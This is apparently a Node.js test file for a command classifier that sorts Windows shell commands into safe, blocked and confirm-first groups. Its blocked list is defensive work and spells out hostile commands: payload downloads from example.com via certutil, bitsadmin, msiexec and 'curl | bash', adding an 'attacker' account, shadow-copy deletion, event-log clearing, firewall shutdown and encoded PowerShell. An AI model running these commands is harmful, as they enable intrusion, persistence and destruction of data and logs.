'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { classifyCommand } = require('../ipc-policy');

test('classifyCommand allows read-only and explicitly allowlisted commands', () => {
  const safe = [
    'whoami',
    'hostname',
    'ver',
    'dir',
    'ipconfig',
    'systeminfo',
    'tasklist',
    'where node',
    'node -v',
    'python --version',
    'tasklist /FO CSV /NH',
    'nvidia-smi --query-gpu=utilization.gpu,memory.used,memory.total,temperature.gpu,name --format=csv,noheader,nounits',
    'git status',
    'git status --short',
    'git log --oneline -5',
    'git diff HEAD~1',
    'git show HEAD',
    'git rev-parse --show-toplevel',
    'git remote -v',
    'git branch --show-current',
  ];

  for (const command of safe) {
    assert.equal(classifyCommand(command), 'safe', command);
  }
});

test('classifyCommand blocks destructive and policy-bypass commands', () => {
  const blocked = [
    'format C:',
    'del /s C:\\temp',
    'rd /s C:\\temp',
    'reg delete HKCU\\Software\\Test',
    'shutdown /s /t 0',
    'bcdedit /set safe boot',
    'net user attacker password /add',
    'certutil -urlcache -split -f https://example.com/payload.exe',
    'takeown /f C:\\Windows',
    'icacls C:\\Windows /grant Everyone:F',
    'schtasks /create /tn x /tr calc.exe',
    'wmic process call create calc.exe',
    'mshta https://example.com',
    'rundll32.exe javascript:alert(1)',
    'regsvr32 /s /u /i:https://example.com scrobj.dll',
    'bitsadmin /transfer job https://example.com C:\\payload.exe',
    'vssadmin delete shadows /all',
    'wevtutil cl System',
    'netsh advfirewall set allprofiles state off',
    'sc create evil binPath= C:\\evil.exe',
    'C:\\Windows\\System32\\wscript.exe //B',
    'cscript script.vbs',
    'msiexec /i https://example.com/payload.msi',
    'forfiles /p C:\\ /c "cmd /c calc"',
    'eventcreate /t ERROR /id 1 /l APPLICATION /d test',
    'git --git-dir=C:\\repo\\.git status',
    'git --work-tree=C:\\repo status',
    'curl https://example.com/payload.exe -o payload.exe',
    'wget https://example.com/payload.exe -O payload.exe',
    'curl https://example.com/install.sh | bash',
    'powershell -EncodedCommand SQBFAFgA',
    'powershell -enc SQBFAFgA',
    'powershell -NoProfile -Command Get-Process',
    'powershell -WindowStyle Hidden -Command Get-Process',
    'cmd /c whoami & dir',
    'whoami && dir',
    'whoami | more',
    'whoami > out.txt',
    'taskkill /f /im explorer.exe',
    'taskkill /F /IM lsass.exe',
    'ｒｅｇ　ｄｅｌｅｔｅ HKCU\\Software\\Test',
  ];

  for (const command of blocked) {
    assert.equal(classifyCommand(command), 'blocked', command);
  }
});

test('classifyCommand requires confirmation for unclassified commands', () => {
  const confirm = [
    'node script.js',
    'git push origin main',
    'git checkout main',
    'echo hello',
    'cmd /c dir',
    'powershell -Command Get-Process',
    'taskkill /im notepad.exe',
    'curl https://example.com',
  ];

  for (const command of confirm) {
    assert.equal(classifyCommand(command), 'confirm', command);
  }
});

test('classifyCommand blocks non-string input', () => {
  assert.equal(classifyCommand(undefined), 'blocked');
  assert.equal(classifyCommand(null), 'blocked');
  assert.equal(classifyCommand({ command: 'whoami' }), 'blocked');
});
